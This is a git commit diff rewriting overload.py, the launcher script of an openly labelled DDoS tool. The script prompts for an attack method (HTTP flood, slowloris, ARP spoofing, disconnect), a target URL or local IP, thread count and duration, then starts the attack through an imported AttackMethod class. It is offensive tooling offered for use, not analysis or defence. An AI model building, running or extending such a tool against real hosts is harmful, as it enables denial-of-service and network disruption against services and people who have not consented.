8302e29abddf42fa6e95b578b6a9b398ef498c02
NeThCoderGT <nethbjgame@gmail.com>
2025-02-06 18:25:32 -0800

    Add files via upload

--- overload.py
+++ overload.py
@@ -1,53 +1,58 @@
-# Created by nuvem and tsk
+"""Main script to start GUI DoS attack application."""
 
-# Import modules
+# -*- coding: utf-8 -*-
 import os
 import sys
-import argparse
+
 from colorama import Fore
 
-os.system("@cls & @title Overload DDOS Tool by: 7zx and 8fn & @color e")
-
-# Get the actual directory
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
+os.system("cls" if os.name == "nt" else "clear")
 
 try:
-    from tools.crash import CriticalError
-    import tools.addons.clean
-    import tools.addons.logo
-    # import tools.addons.winpcap
-    import tools.addons.wireshark
+    from tools.addons.checks import (check_http_target_input,
+                                     check_local_target_input,
+                                     check_method_input, check_number_input)
+    from tools.addons.ip_tools import show_local_host_ips
+    from tools.addons.logo import show_logo
     from tools.method import AttackMethod
-except ImportError as err:
-    CriticalError("Failed to import some packages", err)
-    sys.exit(1)
+except (ImportError, NameError) as err:
+    print("\nFailed to import something", err)
 
-method = "HTTP"
-logo = """
- ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
-▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
-▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
-▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
-░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
-░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
-  ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
-░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
-    ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
-              ░                                               ░     
-"""
-CRED2 = '\33[91m'
+
+def main() -> None:
+    """Run main application."""
+    show_logo()
+    try:
+        if (method := check_method_input()) in ["arp-spoof", "disconnect"]:
+            show_local_host_ips()
+        target = (
+            check_http_target_input()
+            if method not in ["arp-spoof", "disconnect"]
+            else check_local_target_input()
+        )
+        threads = (
+            check_number_input("threads")
+            if method not in ["arp-spoof", "disconnect"]
+            else 1
+        )
+        time = check_number_input("time")
+        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0
+
+        with AttackMethod(
+            duration=time,
+            method_name=method,
+            threads=threads,
+            target=target,
+            sleep_time=sleep_time,
+        ) as attack:
+            attack.start()
+    except KeyboardInterrupt:
+        print(
+            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
+        )
+        sys.exit(1)
+
 
 if __name__ == "__main__":
-    # Print help
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(CRED2 + logo + CRED2)
-    print("├───DDOS TOOL LAYER 7")
-    time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
-    threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
-    target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
-    with AttackMethod(
-        duration=time, name=method, threads=threads, target=target
-    ) as Flood:
-        Flood.Start()
-else:
-    sys.exit(1)
+    main()
